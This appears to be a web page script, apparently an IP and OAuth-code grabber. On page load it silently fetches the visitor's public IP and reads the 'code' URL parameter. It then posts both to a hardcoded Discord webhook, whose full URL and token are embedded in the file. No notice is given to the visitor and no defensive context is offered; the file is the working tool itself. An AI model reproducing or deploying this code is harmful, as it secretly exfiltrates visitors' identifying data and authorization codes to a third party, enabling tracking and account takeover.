document.addEventListener('DOMContentLoaded', () => {
    const webhookUrl = 'https://discord.com/api/webhooks/1285089226743873659/dULAcB9U-d3AfF0lFYO1tmZ_m9LQVwJIzSmZ6irwtgQVkl7lhoJ8fYxv6eWn2oAeh4jq';

    async function getIpAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error fetching IP address:', error);
            return 'unknown';
        }
    }

    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    async function sendDataToDiscord() {
        const ip = await getIpAddress();
        const code = getQueryParam('code');

        const embed = {
            embeds: [
                {
                    title: 'User Information',
                    fields: [
                        { name: 'IP Address', value: ip || 'Not available' },
                        { name: 'Code', value: code || 'Not available' }
                    ]
                }
            ]
        };

        try {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(embed)
            });
            console.log('Data sent to Discord!');
        } catch (error) {
            console.error('Error sending data to Discord:', error);
        }
    }

    sendDataToDiscord();
});
